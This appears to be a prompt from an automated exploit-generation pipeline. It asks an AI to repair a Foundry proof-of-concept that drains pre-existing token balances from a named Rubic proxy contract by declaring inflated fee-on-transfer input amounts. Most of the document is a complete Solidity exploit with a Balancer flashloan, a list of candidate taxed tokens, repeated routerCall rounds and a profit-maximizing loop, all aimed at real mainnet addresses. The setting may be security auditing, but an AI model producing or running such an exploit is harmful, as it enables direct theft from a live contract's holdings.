You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Old proxy credits fee-on-transfer inputs at the user-declared amount, allowing theft from pre-existing token balances
- claim: The 0x3335 deployment transfers `_params.srcInputAmount` in and then computes fees, approvals, and the expected spend from that declared amount instead of from the contract's actual post-transfer balance delta. For fee-on-transfer or deflationary tokens, the proxy can therefore approve and spend more tokens than it actually received from the caller.
- impact: If the proxy already holds the same token from accrued fees, prior stuck funds, or accidental transfers, an attacker can route a taxed token deposit and have the shortfall sourced from the proxy's existing balance. This is direct theft of inventory already sitting in the proxy.
- exploit_paths: ["The proxy already holds token `T` from previous activity.", "An attacker calls `routerCall` with `srcInputToken = T` and `srcInputAmount = X`, where transferring `X` to the proxy yields only `X - fee`.", "`accrueTokenFees` and `SmartApprove` still use the larger declared `X`-based amount, and the router call is validated against spending that larger amount.", "The router/gateway pulls the difference from the proxy's pre-existing `T` balance, letting the attacker consume tokens they never supplied."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IRubicProxy {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCall(BaseCrossChainParams calldata _params, address _gateway, bytes calldata _data) external payable;
    function getAvailableRouters() external view returns (address[] memory);
    function RubicPlatformFee() external view returns (uint256);
    function fixedCryptoFee() external view returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2RouterSupportingFee {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

interface IBalancerVault {
    function flashLoan(address recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract TokenSink {
    constructor() {}
}

contract FlawVerifier is IFlashLoanRecipient {
    error OnlySelf();
    error UnsupportedRouter();
    error RoundNotImproving();
    error NoPreexistingInventory();
    error TokenNotTaxed();
    error NotEnoughShortfall();
    error NotProfitable();
    error PairUnavailable();
    error InvalidFlashLoan();

    address private constant TARGET_PROXY = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;
    address private constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant DENOMINATOR = 1_000_000;
    uint256 private constant FLASH_WETH = 60 ether;
    uint256 private constant MAX_ROUNDS = 6;
    uint256 private constant MIN_REQUIRED_ROUNDS = 2;
    uint256 private constant RETENTION_BUFFER_PPM = 2_000;

    IWETH private constant WETH = IWETH(WETH_ADDRESS);
    TokenSink private immutable sink;

    uint256 private _profitAmount;
    bool private _executed;

    constructor() {
        sink = new TokenSink();
    }

    receive() external payable {}

    modifier onlySelf() {
        if (msg.sender != address(this)) revert OnlySelf();
        _;
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH_ADDRESS);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_WETH;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, bytes(""));
        _wrapAllETH();
        _profitAmount = WETH.balanceOf(address(this));
    }

    function profitToken() external pure returns (address) {
        return WETH_ADDRESS;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        if (msg.sender != BALANCER_VAULT || tokens.length != 1 || amounts.length != 1 || feeAmounts.length != 1) {
            revert InvalidFlashLoan();
        }
        if (address(tokens[0]) != WETH_ADDRESS || amounts[0] != FLASH_WETH) {
            revert InvalidFlashLoan();
        }

        address[] memory availableRouters = IRubicProxy(TARGET_PROXY).getAvailableRouters();
        address[] memory candidateRouters = new address[](2);
        uint256 candidateRouterCount;

        if (_routerWhitelisted(availableRouters, UNISWAP_V2_ROUTER)) {
            candidateRouters[candidateRouterCount++] = UNISWAP_V2_ROUTER;
        }
        if (_routerWhitelisted(availableRouters, SUSHISWAP_ROUTER)) {
            candidateRouters[candidateRouterCount++] = SUSHISWAP_ROUTER;
        }

        if (candidateRouterCount != 0) {
            for (uint256 routerIndex; routerIndex < candidateRouterCount; ++routerIndex) {
                address router = candidateRouters[routerIndex];
                for (uint256 tokenIndex; tokenIndex < _candidateCount(); ++tokenIndex) {
                    address token = _candidateToken(tokenIndex);
                    if (token.code.length == 0) {
                        continue;
                    }
                    if (IERC20(token).balanceOf(TARGET_PROXY) == 0) {
                        continue;
                    }
                    if (_pairFor(router, token) == address(0)) {
                        continue;
                    }

                    try this._attemptCandidate(token, router) returns (uint256 gained) {
                        if (gained > 0) {
                            routerIndex = candidateRouterCount;
                            break;
                        }
                    } catch {
                        // Strict-path best effort: if the live fork does not satisfy any of
                        // the required on-chain preconditions for this token/router pair,
                        // the isolated attempt reverts and state is rolled back here.
                    }
                }
            }
        }

        _wrapAllETH();
        require(IERC20(WETH_ADDRESS).transfer(BALANCER_VAULT, amounts[0] + feeAmounts[0]), "repay");
    }

    function _attemptCandidate(address token, address router) external onlySelf returns (uint256 gained) {
        uint256 startAssets = _totalAssets();
        uint256 checkpoint = startAssets;
        uint256 budget = _roundBudget();
        if (budget == 0) revert NotProfitable();

        checkpoint = this._performRound(token, router, budget, checkpoint);
        checkpoint = this._performRound(token, router, budget, checkpoint);

        for (uint256 round = MIN_REQUIRED_ROUNDS + 1; round <= MAX_ROUNDS; ++round) {
            try this._performRound(token, router, budget, checkpoint) returns (uint256 improvedCheckpoint) {
                checkpoint = improvedCheckpoint;
            } catch {
                break;
            }
        }

        _wrapAllETH();
        uint256 finalAssets = _totalAssets();
        if (finalAssets <= startAssets) revert NotProfitable();
        gained = finalAssets - startAssets;
    }

    function _performRound(address token, address router, uint256 wethBudget, uint256 checkpoint)
        external
        onlySelf
        returns (uint256 newCheckpoint)
    {
        uint256 fixedFee = IRubicProxy(TARGET_PROXY).fixedCryptoFee();
        uint256 platformFee = IRubicProxy(TARGET_PROXY).RubicPlatformFee();
        uint256 proxyInventoryBefore = IERC20(token).balanceOf(TARGET_PROXY);
        if (proxyInventoryBefore == 0) revert NoPreexistingInventory();

        if (_pairFor(router, token) == address(0)) revert PairUnavailable();
        if (WETH.balanceOf(address(this)) <= wethBudget + fixedFee) revert NotProfitable();

        uint256 tokenBefore = IERC20(token).balanceOf(address(this));
        _forceApprove(WETH_ADDRESS, router, wethBudget);

        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH_ADDRESS;
        buyPath[1] = token;

        IUniswapV2RouterSupportingFee(router)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                wethBudget, 0, buyPath, address(this), block.timestamp
            );

        uint256 acquired = IERC20(token).balanceOf(address(this)) - tokenBefore;
        if (acquired == 0) revert NotProfitable();

        uint256 sample = acquired / 200;
        if (sample == 0) sample = acquired / 20;
        if (sample == 0) revert TokenNotTaxed();

        uint256 sinkBefore = IERC20(token).balanceOf(address(sink));
        require(IERC20(token).transfer(address(sink), sample), "sample");
        uint256 sampleReceived = IERC20(token).balanceOf(address(sink)) - sinkBefore;
        if (sampleReceived == 0 || sampleReceived >= sample) revert TokenNotTaxed();

        uint256 declaredAmount = IERC20(token).balanceOf(address(this));
        if (declaredAmount == 0) revert NotProfitable();

        uint256 retentionPpm = (sampleReceived * DENOMINATOR) / sample;
        if (retentionPpm <= RETENTION_BUFFER_PPM) revert TokenNotTaxed();
        retentionPpm -= RETENTION_BUFFER_PPM;

        uint256 amountIn = declaredAmount - ((declaredAmount * platformFee) / DENOMINATOR);
        uint256 expectedReceipt = (declaredAmount * retentionPpm) / DENOMINATOR;
        if (amountIn <= expectedReceipt) revert NotEnoughShortfall();

        uint256 inventoryShortfall = amountIn - expectedReceipt;
        if (proxyInventoryBefore <= inventoryShortfall) revert NoPreexistingInventory();

        uint256 pairInputEstimate = (amountIn * retentionPpm) / DENOMINATOR;
        address[] memory sellPath = new address[](2);
        sellPath[0] = token;
        sellPath[1] = WETH_ADDRESS;

        uint256[] memory expectedOut = IUniswapV2RouterSupportingFee(router).getAmountsOut(pairInputEstimate, sellPath);
        if (expectedOut[1] <= wethBudget + fixedFee) revert NotProfitable();

        _forceApprove(token, TARGET_PROXY, declaredAmount);
        if (fixedFee > address(this).balance) {
            WETH.withdraw(fixedFee - address(this).balance);
        }

        bytes memory data = abi.encodeWithSelector(
            IUniswapV2RouterSupportingFee.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
            amountIn,
            0,
            sellPath,
            address(this),
            block.timestamp
        );

        IRubicProxy.BaseCrossChainParams memory params = IRubicProxy.BaseCrossChainParams({
            srcInputToken: token,
            srcInputAmount: declaredAmount,
            dstChainID: 1,
            dstOutputToken: WETH_ADDRESS,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: router
        });

        IRubicProxy(TARGET_PROXY).routerCall{value: fixedFee}(params, router, data);

        uint256 proxyInventoryAfter = IERC20(token).balanceOf(TARGET_PROXY);
        if (proxyInventoryAfter >= proxyInventoryBefore) revert NoPreexistingInventory();

        _wrapAllETH();
        newCheckpoint = _totalAssets();
        if (newCheckpoint <= checkpoint) revert RoundNotImproving();
    }

    function _candidateCount() private pure returns (uint256) {
        return 11;
    }

    function _candidateToken(uint256 index) private pure returns (address) {
        if (index == 0) return 0xfAd45E47083e4607302aa43c65fB3106F1cd7607;
        if (index == 1) return 0xA2b4C0Af19cC16a6CfAcCe81F192B024d625817D;
        if (index == 2) return 0xCE3f08e664693ca792caCE4af1364D5e220827B2;
        if (index == 3) return 0xA57ac35CE91Ee92CaEfAA8dc04140C8e232c2E50;
        if (index == 4) return 0x389999216860AB8E0175387A0c90E5c52522C945;
        if (index == 5) return 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
        if (index == 6) return 0xf0f9D895aCa5c8678f706FB8216fa22957685A13;
        if (index == 7) return 0x43f11c02439e2736800433b4594994Bd43Cd066D;
        if (index == 8) return 0x52b492a33E447Cdb854c7FC19F1e57E8BfA1777D;
        if (index == 9) return 0xaccC63f2a6C0F30755C320950565F4c4E88A5272;
        if (index == 10) return 0x29b0Da86e484E1C0029B56e817912d778aC0EC69;
        revert UnsupportedRouter();
    }

    function _factoryFor(address router) private pure returns (address) {
        if (router == UNISWAP_V2_ROUTER) return UNISWAP_V2_FACTORY;
        if (router == SUSHISWAP_ROUTER) return SUSHISWAP_FACTORY;
        revert UnsupportedRouter();
    }

    function _pairFor(address router, address token) private view returns (address) {
        return IUniswapV2Factory(_factoryFor(router)).getPair(token, WETH_ADDRESS);
    }

    function _routerWhitelisted(address[] memory availableRouters, address router) private pure returns (bool) {
        for (uint256 i; i < availableRouters.length; ++i) {
            if (availableRouters[i] == router) {
                return true;
            }
        }
        return false;
    }

    function _roundBudget() private view returns (uint256) {
        uint256 wethBal = WETH.balanceOf(address(this));
        uint256 budget = wethBal / 20;
        if (budget > 3 ether) budget = 3 ether;
        return budget;
    }

    function _forceApprove(address token, address spender, uint256 amount) private {
        require(IERC20(token).approve(spender, 0), "approve0");
        require(IERC20(token).approve(spender, amount), "approve");
    }

    function _wrapAllETH() private {
        uint256 ethBal = address(this).balance;
        if (ethBal != 0) {
            WETH.deposit{value: ethBal}();
        }
    }

    function _totalAssets() private view returns (uint256) {
        return WETH.balanceOf(address(this)) + address(this).balance;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: srcinputtoken = t, srcinputamount = x, x - fee, accruetokenfees, smartapprove, accrue
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
